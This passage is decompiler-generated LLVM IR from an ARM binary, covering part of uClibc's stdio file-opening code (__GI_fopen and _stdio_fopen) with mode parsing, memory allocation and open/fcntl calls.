  %v9_14548 = icmp eq i32 %v3_14544, %v1_14548
  br i1 %v9_14548, label %dec_label_pc_14590, label %dec_label_pc_14550

dec_label_pc_14550:                               ; preds = %bb49
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_14540, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_1455c75 = inttoptr i32 %v4_14540 to i32*
  %v2_1455c76 = load i32, i32* %v1_1455c75, align 4
  store i32 %v2_1455c76, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1456078 = icmp eq i32 %v2_1455c76, 0
  br i1 %v9_1456078, label %dec_label_pc_14568, label %dec_label_pc_14580

dec_label_pc_14568:                               ; preds = %dec_label_pc_14550, %dec_label_pc_14568.dec_label_pc_1455c_crit_edge
  %v0_1456879 = phi i32 [ %v1_14560.pre, %dec_label_pc_14568.dec_label_pc_1455c_crit_edge ], [ 0, %dec_label_pc_14550 ]
  store i32 %v0_1456879, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14578 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14578, label %dec_label_pc_1457c, label %dec_label_pc_14568.dec_label_pc_1455c_crit_edge

dec_label_pc_14568.dec_label_pc_1455c_crit_edge:  ; preds = %dec_label_pc_14568
  %v0_1455c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14560.pre = load i32, i32* @r4, align 4
  %v1_1455c = inttoptr i32 %v0_1455c.pre to i32*
  %v2_1455c = load i32, i32* %v1_1455c, align 4
  store i32 %v2_1455c, i32* %r3.global-to-local, align 4
  %v3_14560 = icmp uge i32 %v2_1455c, %v1_14560.pre
  store i1 %v3_14560, i1* %cpsr_c.global-to-local, align 1
  %v9_14560 = icmp eq i32 %v2_1455c, %v1_14560.pre
  br i1 %v9_14560, label %dec_label_pc_14568, label %dec_label_pc_14580

dec_label_pc_1457c:                               ; preds = %dec_label_pc_14568
  %v0_1457c = load i32, i32* @r4, align 4
  store i32 %v0_1457c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14580

dec_label_pc_14580:                               ; preds = %dec_label_pc_14550, %dec_label_pc_14568.dec_label_pc_1455c_crit_edge, %dec_label_pc_1457c
  %v0_14580 = phi i32 [ %v0_1457c, %dec_label_pc_1457c ], [ %v2_1455c76, %dec_label_pc_14550 ], [ %v2_1455c, %dec_label_pc_14568.dec_label_pc_1455c_crit_edge ]
  %v1_14580 = phi i32 [ %v0_1457c, %dec_label_pc_1457c ], [ 0, %dec_label_pc_14550 ], [ %v1_14560.pre, %dec_label_pc_14568.dec_label_pc_1455c_crit_edge ]
  %v3_14580 = icmp uge i32 %v0_14580, %v1_14580
  store i1 %v3_14580, i1* %cpsr_c.global-to-local, align 1
  %v9_14580 = icmp eq i32 %v0_14580, %v1_14580
  br i1 %v9_14580, label %bb51, label %bb50

bb50:                                             ; preds = %dec_label_pc_14580
  %v1_14584 = load i32, i32* @r5, align 4
  store i32 %v1_14584, i32* %r0.global-to-local, align 4
  br label %bb51

bb51:                                             ; preds = %dec_label_pc_14580, %bb50
  %v1_14588 = xor i1 %v9_14580, true
  call void @__pseudo_cond_branch(i1 %v1_14588, i32 ptrtoint (i32* @global_var_12a60.740 to i32))
  %v0_1458c = load i32, i32* %sl.global-to-local, align 4
  %v1_1458c = load i32, i32* @r5, align 4
  %v2_1458c = add i32 %v1_1458c, 8
  %v3_1458c = inttoptr i32 %v2_1458c to i32*
  store i32 %v0_1458c, i32* %v3_1458c, align 4
  %v0_14594.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_14590

dec_label_pc_14590:                               ; preds = %bb49, %bb51
  %v0_14594 = phi i32 [ %v0_14540, %bb49 ], [ %v0_14594.pre, %bb51 ]
  store i32 80, i32* %r3.global-to-local, align 4
  %v2_14594 = add i32 %v0_14594, 80
  %v3_14594 = inttoptr i32 %v2_14594 to i32*
  %v4_14594 = load i32, i32* %v3_14594, align 4
  store i32 %v4_14594, i32* %r2.global-to-local, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_1459c = add i32 %v0_14594, 160
  %v3_1459c = inttoptr i32 %v2_1459c to i32*
  %v4_1459c = load i32, i32* %v3_1459c, align 4
  store i32 %v4_1459c, i32* %r0.global-to-local, align 4
  %v1_145a0 = inttoptr i32 %v4_14594 to i32*
  %v2_145a0 = load i32, i32* %v1_145a0, align 4
  store i32 %v2_145a0, i32* %r3.global-to-local, align 4
  %v1_145a4 = add i32 %v4_1459c, 4
  %v2_145a4 = inttoptr i32 %v1_145a4 to i32*
  %v3_145a4 = load i32, i32* %v2_145a4, align 4
  store i32 %v3_145a4, i32* %r1.global-to-local, align 4
  %v1_145a8 = add i32 %v2_145a0, 1
  store i32 %v1_145a8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_145ac = icmp eq i32 %v3_145a4, 0
  store i32 %v1_145a8, i32* %v1_145a0, align 4
  br i1 %v2_145ac, label %dec_label_pc_145b8, label %dec_label_pc_14618

dec_label_pc_145b8:                               ; preds = %dec_label_pc_14590
  %v0_145b8 = load i32, i32* %r1.global-to-local, align 4
  %v1_145b8 = load i32, i32* %r0.global-to-local, align 4
  %v2_145b8 = add i32 %v1_145b8, 8
  %v3_145b8 = inttoptr i32 %v2_145b8 to i32*
  store i32 %v0_145b8, i32* %v3_145b8, align 4
  %v0_145bc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_145bc, i32* @r5, align 4
  br label %dec_label_pc_145c0

dec_label_pc_145c0:                               ; preds = %dec_label_pc_145f0.dec_label_pc_145c0_crit_edge, %dec_label_pc_145b8
  %v0_145c0 = phi i32 [ %v0_145c0.pre, %dec_label_pc_145f0.dec_label_pc_145c0_crit_edge ], [ %v0_145bc, %dec_label_pc_145b8 ]
  %v1_145c0 = inttoptr i32 %v0_145c0 to i32*
  %v2_145c0 = load i32, i32* %v1_145c0, align 4
  store i32 %v2_145c0, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_145c0, i32* %r2.global-to-local, align 4
  %v2_145cc64 = load i32, i32* %v1_145c0, align 4
  store i32 %v2_145cc64, i32* %r3.global-to-local, align 4
  %v3_145d066 = icmp uge i32 %v2_145cc64, %v2_145c0
  store i1 %v3_145d066, i1* %cpsr_c.global-to-local, align 1
  %v9_145d072 = icmp eq i32 %v2_145cc64, %v2_145c0
  br i1 %v9_145d072, label %dec_label_pc_145d8, label %dec_label_pc_145f0

dec_label_pc_145d8:                               ; preds = %dec_label_pc_145c0, %dec_label_pc_145d8.dec_label_pc_145cc_crit_edge
  %v0_145d873 = phi i32 [ %v1_145d0.pre, %dec_label_pc_145d8.dec_label_pc_145cc_crit_edge ], [ %v2_145c0, %dec_label_pc_145c0 ]
  store i32 %v0_145d873, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_145e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_145e8, label %dec_label_pc_145ec, label %dec_label_pc_145d8.dec_label_pc_145cc_crit_edge

dec_label_pc_145d8.dec_label_pc_145cc_crit_edge:  ; preds = %dec_label_pc_145d8
  %v0_145cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_145d0.pre = load i32, i32* @r4, align 4
  %v1_145cc = inttoptr i32 %v0_145cc.pre to i32*
  %v2_145cc = load i32, i32* %v1_145cc, align 4
  store i32 %v2_145cc, i32* %r3.global-to-local, align 4
  %v3_145d0 = icmp uge i32 %v2_145cc, %v1_145d0.pre
  store i1 %v3_145d0, i1* %cpsr_c.global-to-local, align 1
  %v9_145d0 = icmp eq i32 %v2_145cc, %v1_145d0.pre
  br i1 %v9_145d0, label %dec_label_pc_145d8, label %dec_label_pc_145f0

dec_label_pc_145ec:                               ; preds = %dec_label_pc_145d8
  %v0_145ec = load i32, i32* @r4, align 4
  store i32 %v0_145ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_145f0

dec_label_pc_145f0:                               ; preds = %dec_label_pc_145c0, %dec_label_pc_145d8.dec_label_pc_145cc_crit_edge, %dec_label_pc_145ec
  %v0_145f8 = phi i32 [ %v0_145ec, %dec_label_pc_145ec ], [ %v2_145cc64, %dec_label_pc_145c0 ], [ %v2_145cc, %dec_label_pc_145d8.dec_label_pc_145cc_crit_edge ]
  %v1_145f0 = phi i32 [ %v0_145ec, %dec_label_pc_145ec ], [ %v2_145c0, %dec_label_pc_145c0 ], [ %v1_145d0.pre, %dec_label_pc_145d8.dec_label_pc_145cc_crit_edge ]
  %v3_145f0 = icmp uge i32 %v0_145f8, %v1_145f0
  store i1 %v3_145f0, i1* %cpsr_c.global-to-local, align 1
  %v9_145f0 = icmp eq i32 %v0_145f8, %v1_145f0
  br i1 %v9_145f0, label %dec_label_pc_145f8, label %dec_label_pc_145f0.dec_label_pc_145c0_crit_edge

dec_label_pc_145f0.dec_label_pc_145c0_crit_edge:  ; preds = %dec_label_pc_145f0
  %v0_145c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_145c0

dec_label_pc_145f8:                               ; preds = %dec_label_pc_145f0
  %v2_145f8 = icmp ne i32 %v1_145f0, 0
  store i1 %v2_145f8, i1* %cpsr_c.global-to-local, align 1
  %v7_145fc = icmp slt i32 %v1_145f0, 2
  br i1 %v7_145fc, label %dec_label_pc_14618, label %dec_label_pc_14600

dec_label_pc_14600:                               ; preds = %dec_label_pc_145f8
  %v0_14600 = load i32, i32* @r5, align 4
  store i32 %v0_14600, i32* %r0.global-to-local, align 4
  %v0_14604 = load i32, i32* %r1.global-to-local, align 4
  %v1_14604 = add i32 %v0_14604, 129
  store i32 %v1_14604, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14618

dec_label_pc_14618:                               ; preds = %dec_label_pc_14590, %dec_label_pc_14600, %dec_label_pc_145f8
  %v0_14618 = call i32 @_stdio_openlist_dec_use()
  %v0_1461c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_1461c, i32* %r0.global-to-local, align 4
  %v2_14624 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_14624, i32* @r4, align 4
  store i32 %v6_1430c, i32* @r5, align 4
  store i32 %v9_1430c, i32* @r6, align 4
  store i32 %v12_1430c, i32* @r7, align 4
  ret i32 %v0_1461c

; uselistorder directives
  uselistorder i32 %v0_145ec, { 1, 0, 2 }
  uselistorder i32 %v1_145d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_145c0, { 1, 0 }
  uselistorder i32 %v0_14594, { 1, 0 }
  uselistorder i32 %v0_1457c, { 1, 0, 2 }
  uselistorder i32 %v1_14560.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_14548, { 1, 0 }
  uselistorder i32 %v0_14500, { 1, 0, 2 }
  uselistorder i32 %v1_144e4.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14474, { 1, 0, 2 }
  uselistorder i32 %v1_14458.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14448, { 1, 0 }
  uselistorder i32 %v0_14404, { 1, 0, 2 }
  uselistorder i32 %v1_143e8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_143c8, { 1, 0 }
  uselistorder i32 %v1_14354.pre, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 41, 4, 5, 6, 7, 8, 10, 9, 42, 11, 14, 12, 13, 15, 17, 16, 43, 18, 19, 20, 21, 22, 24, 23, 44, 25, 26, 27, 28, 30, 29, 45, 31, 32, 33, 34, 35, 36, 37, 39, 38, 46, 40 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 25, 21, 22, 0, 23, 24, 26, 1 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 24, 25, 3, 4, 5, 26, 27, 6, 7, 8, 9, 28, 29, 10, 11, 12, 13, 14, 30, 31, 15, 16, 17, 32, 33, 18, 19, 20, 21, 34, 35, 22, 23 }
  uselistorder i32 (i32)* @__GI___libc_close, { 21, 20, 25, 24, 19, 23, 22, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder label %dec_label_pc_14618, { 1, 2, 0 }
  uselistorder label %dec_label_pc_145f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_145d8, { 1, 0 }
  uselistorder label %dec_label_pc_14590, { 1, 0 }
  uselistorder label %bb51, { 1, 0 }
  uselistorder label %dec_label_pc_14580, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14568, { 1, 0 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %dec_label_pc_1452c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_14504, { 2, 1, 0 }
  uselistorder label %dec_label_pc_144ec, { 1, 0 }
  uselistorder label %dec_label_pc_144a0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14478, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14460, { 1, 0 }
  uselistorder label %dec_label_pc_14418, { 1, 0 }
  uselistorder label %bb47, { 1, 0 }
  uselistorder label %dec_label_pc_14408, { 2, 1, 0 }
  uselistorder label %dec_label_pc_143f0, { 1, 0 }
  uselistorder label %bb45, { 1, 0 }
  uselistorder label %bb43, { 1, 0 }
  uselistorder label %dec_label_pc_14390, { 1, 0 }
  uselistorder label %dec_label_pc_14384, { 1, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %dec_label_pc_14374, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1435c, { 1, 0 }
}

define i32 @function_14630(i32 %arg1) local_unnamed_addr {
dec_label_pc_14630:
  %v0_14630 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14630, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14630
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14630, %bb
  %v10_14638 = phi i32 [ %arg1, %dec_label_pc_14630 ], [ 0, %bb ]
  ret i32 %v10_14638

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI_fopen() local_unnamed_addr {
entry:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_1464c = call i32 @_stdio_fopen()
  ret i32 %v0_1464c
}

define i32 @_stdio_fopen() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_1465c = load i32, i32* @r4, align 4
  store i32 %v3_1465c, i32* %stack_var_-24, align 4
  %v6_1465c = load i32, i32* @r5, align 4
  %v9_1465c = load i32, i32* @r6, align 4
  %v12_1465c = load i32, i32* @r7, align 4
  %v15_1465c = load i32, i32* @r8, align 4
  %v0_14660 = load i32, i32* @r1, align 4
  %v1_14660 = inttoptr i32 %v0_14660 to i8*
  %v2_14660 = load i8, i8* %v1_14660, align 1
  %v2_14668 = icmp ugt i8 %v2_14660, 113
  store i1 %v2_14668, i1* %cpsr_c.global-to-local, align 1
  %v7_14668 = icmp eq i8 %v2_14660, 114
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r8, align 4
  %v0_14674 = load i32, i32* @r0, align 4
  store i32 %v0_14674, i32* @r7, align 4
  %v0_14678 = load i32, i32* @r2, align 4
  store i32 %v0_14678, i32* @r5, align 4
  %v0_1467c = load i32, i32* @r3, align 4
  store i32 %v0_1467c, i32* @r6, align 4
  br i1 %v7_14668, label %dec_label_pc_146d0, label %dec_label_pc_14684

dec_label_pc_14684:                               ; preds = %entry
  %v2_14684 = icmp ugt i8 %v2_14660, 118
  store i1 %v2_14684, i1* %cpsr_c.global-to-local, align 1
  %v7_14684 = icmp eq i8 %v2_14660, 119
  br i1 %v7_14684, label %bb, label %dec_label_pc_14690

bb:                                               ; preds = %dec_label_pc_14684
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_146d4

dec_label_pc_14690:                               ; preds = %dec_label_pc_14684
  %v2_14690 = icmp ugt i8 %v2_14660, 96
  store i1 %v2_14690, i1* %cpsr_c.global-to-local, align 1
  %v7_14690 = icmp eq i8 %v2_14660, 97
  br i1 %v7_14690, label %bb49, label %dec_label_pc_1469c

bb49:                                             ; preds = %dec_label_pc_14690
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_146d4

dec_label_pc_1469c:                               ; preds = %dec_label_pc_14690, %dec_label_pc_1476c, %dec_label_pc_14740
  store i32 50848, i32* %r2.global-to-local, align 4
  %v0_146a0 = call i32 @__aeabi_read_tp()
  store i32 %v0_146a0, i32* %r0.global-to-local, align 4
  %v3_146a4 = load i16, i16* @global_var_20d4c.598, align 2
  %v4_146a4 = sext i16 %v3_146a4 to i32
  store i32 %v4_146a4, i32* %r2.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_146ac = load i32, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146ac = icmp eq i32 %v0_146ac, 0
  %v3_146b0 = add i32 %v4_146a4, %v0_146a0
  %v4_146b0 = inttoptr i32 %v3_146b0 to i32*
  store i32 22, i32* %v4_146b0, align 4
  br i1 %v2_146ac, label %dec_label_pc_14a74, label %dec_label_pc_146b8

dec_label_pc_146b8:                               ; preds = %dec_label_pc_14790._crit_edge, %dec_label_pc_1469c
  %v0_146b8 = load i32, i32* @r5, align 4
  %v1_146b8 = inttoptr i32 %v0_146b8 to i16*
  %v2_146b8 = load i16, i16* %v1_146b8, align 2
  %v3_146b8 = zext i16 %v2_146b8 to i32
  store i32 %v3_146b8, i32* %r3.global-to-local, align 4
  %v1_146bc = and i32 %v3_146b8, 8192
  %v2_146bc = icmp eq i32 %v1_146bc, 0
  br i1 %v2_146bc, label %dec_label_pc_14a74, label %dec_label_pc_146c4

dec_label_pc_146c4:                               ; preds = %dec_label_pc_146b8
  store i32 %v0_146b8, i32* @r0, align 4
  %v0_146c8 = call i32 @free()
  store i32 %v0_146c8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14a74

dec_label_pc_146d0:                               ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_146d4

dec_label_pc_146d4:                               ; preds = %bb, %bb49, %dec_label_pc_146d0
  %v1_146ec = phi i32 [ 1089, %bb49 ], [ 577, %bb ], [ 1, %dec_label_pc_146d0 ]
  %v1_146d4 = add i32 %v0_14660, 1
  %v2_146d4 = inttoptr i32 %v1_146d4 to i8*
  %v3_146d4 = load i8, i8* %v2_146d4, align 1
  %v2_146d8 = icmp ugt i8 %v3_146d4, 97
  store i1 %v2_146d8, i1* %cpsr_c.global-to-local, align 1
  %v7_146d8 = icmp eq i8 %v3_146d4, 98
  %v1_146d4.v0_14660 = select i1 %v7_146d8, i32 %v1_146d4, i32 %v0_14660
  store i32 %v1_146d4.v0_14660, i32* %r3.global-to-local, align 4
  %v1_146e4 = add i32 %v1_146d4.v0_14660, 1
  %v2_146e4 = inttoptr i32 %v1_146e4 to i8*
  %v3_146e4 = load i8, i8* %v2_146e4, align 1
  %v4_146e4 = zext i8 %v3_146e4 to i32
  store i32 %v4_146e4, i32* @r3, align 4
  %v2_146e8 = icmp ugt i8 %v3_146e4, 42
  store i1 %v2_146e8, i1* %cpsr_c.global-to-local, align 1
  %v7_146e8 = icmp eq i8 %v3_146e4, 43
  br i1 %v7_146e8, label %bb52, label %.thread3

bb52:                                             ; preds = %dec_label_pc_146d4
  store i32 %v1_146ec, i32* @r3, align 4
  %v2_146f0 = add nuw nsw i32 %v1_146ec, 1
  store i32 %v2_146f0, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_146d4, %bb52
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_146f4 = icmp eq i32 %v0_14678, 0
  br i1 %v2_146f4, label %dec_label_pc_146fc, label %dec_label_pc_14738

dec_label_pc_146fc:                               ; preds = %.thread3
  store i32 68, i32* @r0, align 4
  %v0_14700 = call i32 @malloc()
  store i32 %v0_14700, i32* %r0.global-to-local, align 4
  store i32 %v0_14700, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_14704 = icmp eq i32 %v0_14700, 0
  br i1 %v3_14704, label %dec_label_pc_14a78, label %dec_label_pc_1470c

dec_label_pc_1470c:                               ; preds = %dec_label_pc_146fc
  %v0_14710 = load i32, i32* @r8, align 4
  %v2_14710 = add i32 %v0_14710, -33136
  store i32 %v2_14710, i32* %r3.global-to-local, align 4
  %v1_14714 = inttoptr i32 %v2_14710 to i32*
  %v2_14714 = load i32, i32* %v1_14714, align 4
  store i32 %v2_14714, i32* %r0.global-to-local, align 4
  %v3_14714 = add i32 %v0_14710, -33132
  %v4_14714 = inttoptr i32 %v3_14714 to i32*
  %v5_14714 = load i32, i32* %v4_14714, align 4
  store i32 %v5_14714, i32* @r1, align 4
  %v6_14714 = add i32 %v0_14710, -33128
  %v7_14714 = inttoptr i32 %v6_14714 to i32*
  %v8_14714 = load i32, i32* %v7_14714, align 4
  store i32 %v8_14714, i32* %r2.global-to-local, align 4
  %v2_14720 = add i32 %v0_14700, 8
  %v3_14720 = inttoptr i32 %v2_14720 to i32*
  store i32 0, i32* %v3_14720, align 4
  %v2_14728 = load i32, i32* @r5, align 4
  %v3_14728 = inttoptr i32 %v2_14728 to i16*
  store i16 8192, i16* %v3_14728, align 2
  %v2_1472c = load i32, i32* %r0.global-to-local, align 4
  %v0_14730 = load i32, i32* @r5, align 4
  %v1_14730 = add i32 %v0_14730, 56
  store i32 %v1_14730, i32* @r3, align 4
  %v1_14734 = inttoptr i32 %v1_14730 to i32*
  store i32 %v2_1472c, i32* %v1_14734, align 4
  %v3_14734 = add i32 %v0_14730, 60
  %v4_14734 = inttoptr i32 %v3_14734 to i32*
  %v5_14734 = load i32, i32* @r1, align 4
  store i32 %v5_14734, i32* %v4_14734, align 4
  %v6_14734 = add i32 %v0_14730, 64
  %v7_14734 = inttoptr i32 %v6_14734 to i32*
  %v8_14734 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_14734, i32* %v7_14734, align 4
  %v0_14738.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14738

dec_label_pc_14738:                               ; preds = %.thread3, %dec_label_pc_1470c
  %v0_14790 = phi i32 [ %v0_1467c, %.thread3 ], [ %v0_14738.pre, %dec_label_pc_1470c ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_14738 = icmp slt i32 %v0_14790, 0
  br i1 %v1_14738, label %dec_label_pc_14790, label %dec_label_pc_14740

dec_label_pc_14740:                               ; preds = %dec_label_pc_14738
  %v0_14744 = load i32, i32* @r4, align 4
  %v2_14744 = and i32 %v0_14744, 131075
  %v1_14748 = add nuw nsw i32 %v2_14744, 1
  store i32 %v1_14748, i32* %r2.global-to-local, align 4
  %v0_1474c = load i32, i32* @r7, align 4
  %v1_1474c = add i32 %v0_1474c, 1
  %v2_14750 = and i32 %v1_1474c, %v1_14748
  store i32 %v2_14750, i32* %r3.global-to-local, align 4
  %v3_14754 = icmp uge i32 %v2_14750, %v1_14748
  store i1 %v3_14754, i1* %cpsr_c.global-to-local, align 1
  %v9_14754 = icmp eq i32 %v2_14750, %v1_14748
  %v1_14758 = load i32, i32* @r5, align 4
  %v2_14758 = add i32 %v1_14758, 4
  %v3_14758 = inttoptr i32 %v2_14758 to i32*
  store i32 %v0_14790, i32* %v3_14758, align 4
  br i1 %v9_14754, label %dec_label_pc_14760, label %dec_label_pc_1469c

dec_label_pc_14760:                               ; preds = %dec_label_pc_14740
  %v0_14760 = load i32, i32* @r4, align 4
  %v1_14760 = load i32, i32* @r7, align 4
  %v2_14760 = sub i32 -1, %v1_14760
  %v3_14760 = and i32 %v0_14760, %v2_14760
  store i32 %v3_14760, i32* @r3, align 4
  %v1_14764 = and i32 %v3_14760, 1024
  %v2_14764 = icmp eq i32 %v1_14764, 0
  br i1 %v2_14764, label %dec_label_pc_14784, label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_14760
  %v0_1476c = load i32, i32* @r6, align 4
  store i32 %v0_1476c, i32* %r0.global-to-local, align 4
  store i32 1024, i32* @r2, align 4
  %v2_14778 = call i32 @__libc_fcntl(i32 %v0_1476c, i32 4)
  store i32 %v2_14778, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1477c = icmp eq i32 %v2_14778, 0
  br i1 %v2_1477c, label %dec_label_pc_1476c.dec_label_pc_14784_crit_edge, label %dec_label_pc_1469c

dec_label_pc_1476c.dec_label_pc_14784_crit_edge:  ; preds = %dec_label_pc_1476c
  %v0_14784.pre = load i32, i32* @r7, align 4
  %v0_14788.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14784

dec_label_pc_14784:                               ; preds = %dec_label_pc_1476c.dec_label_pc_14784_crit_edge, %dec_label_pc_14760
  %v0_14788 = phi i32 [ %v0_14788.pre, %dec_label_pc_1476c.dec_label_pc_14784_crit_edge ], [ %v0_14760, %dec_label_pc_14760 ]
  %v0_14784 = phi i32 [ %v0_14784.pre, %dec_label_pc_1476c.dec_label_pc_14784_crit_edge ], [ %v1_14760, %dec_label_pc_14760 ]
  %v1_14784 = and i32 %v0_14784, 131072
  store i32 %v1_14784, i32* %r3.global-to-local, align 4
  %v2_14788 = or i32 %v1_14784, %v0_14788
  store i32 %v2_14788, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_147b4

dec_label_pc_14790:                               ; preds = %dec_label_pc_14738
  %v2_14790 = icmp eq i32 %v0_14790, -1
  store i1 %v2_14790, i1* %cpsr_c.global-to-local, align 1
  %v7_14790 = icmp eq i32 %v0_14790, -1
  %v0_1479c.pre = load i32, i32* @r4, align 4
  br i1 %v7_14790, label %dec_label_pc_14790._crit_edge, label %bb53

bb53:                                             ; preds = %dec_label_pc_14790
  %v2_14794 = or i32 %v0_1479c.pre, 131072
  store i32 %v2_14794, i32* @r4, align 4
  br label %dec_label_pc_14790._crit_edge

dec_label_pc_14790._crit_edge:                    ; preds = %dec_label_pc_14790, %bb53
  %v0_1479c = phi i32 [ %v2_14794, %bb53 ], [ %v0_1479c.pre, %dec_label_pc_14790 ]
  %v0_14798 = load i32, i32* @r7, align 4
  store i32 %v0_14798, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_147a4 = inttoptr i32 %v0_1479c to i64*
  %v3_147a4 = call i32 @__libc_open(i32 %v0_14798, i64* %v2_147a4)
  store i32 %v3_147a4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_147a8 = icmp slt i32 %v3_147a4, 0
  %v1_147ac = load i32, i32* @r5, align 4
  %v2_147ac = add i32 %v1_147ac, 4
  %v3_147ac = inttoptr i32 %v2_147ac to i32*
  store i32 %v3_147a4, i32* %v3_147ac, align 4
  br i1 %v1_147a8, label %dec_label_pc_146b8, label %.dec_label_pc_147b4_crit_edge

.dec_label_pc_147b4_crit_edge:                    ; preds = %dec_label_pc_14790._crit_edge
  %v0_147b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_147b4

dec_label_pc_147b4:                               ; preds = %.dec_label_pc_147b4_crit_edge, %dec_label_pc_14784
  %v0_147d0 = phi i32 [ %v0_147b8.pre, %.dec_label_pc_147b4_crit_edge ], [ %v2_14788, %dec_label_pc_14784 ]
  %v0_147b4 = load i32, i32* @r5, align 4
  %v1_147b4 = inttoptr i32 %v0_147b4 to i16*
  %v2_147b4 = load i16, i16* %v1_147b4, align 2
  %v3_147b4 = zext i16 %v2_147b4 to i32
  %v1_147b8 = urem i32 %v0_147d0, 4
  %v1_147bc = and i32 %v0_147d0, 1024
  %v1_147c0 = and i32 %v3_147b4, 8192
  %v1_147c4 = add nuw nsw i32 %v1_147b8, 1
  %v2_147c8 = or i32 %v1_147c0, %v1_147bc
  store i32 %v2_147c8, i32* %r3.global-to-local, align 4
  %v1_147cc = xor i32 %v1_147c4, 3
  %v1_147d0 = and i32 %v0_147d0, 131072
  store i32 %v1_147d0, i32* %r2.global-to-local, align 4
  %v2_147d0 = icmp eq i32 %v1_147d0, 0
  %v1_147d4 = add i32 %v0_147b4, 4
  %v2_147d4 = inttoptr i32 %v1_147d4 to i32*
  %v3_147d4 = load i32, i32* %v2_147d4, align 4
  store i32 %v3_147d4, i32* @r4, align 4
  br i1 %v2_147d0, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_147b4
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_147b4, %bb54
  %v0_147e0 = phi i32 [ 0, %dec_label_pc_147b4 ], [ 32768, %bb54 ]
  %v4_147dc = mul nuw nsw i32 %v1_147cc, 16
  %v5_147dc = or i32 %v2_147c8, %v4_147dc
  store i32 %v5_147dc, i32* %r3.global-to-local, align 4
  %v2_147e0 = or i32 %v0_147e0, %v5_147dc
  store i32 %v2_147e0, i32* %r2.global-to-local, align 4
  %v2_147e4 = icmp ugt i32 %v3_147d4, 2147483646
  store i1 %v2_147e4, i1* %cpsr_c.global-to-local, align 1
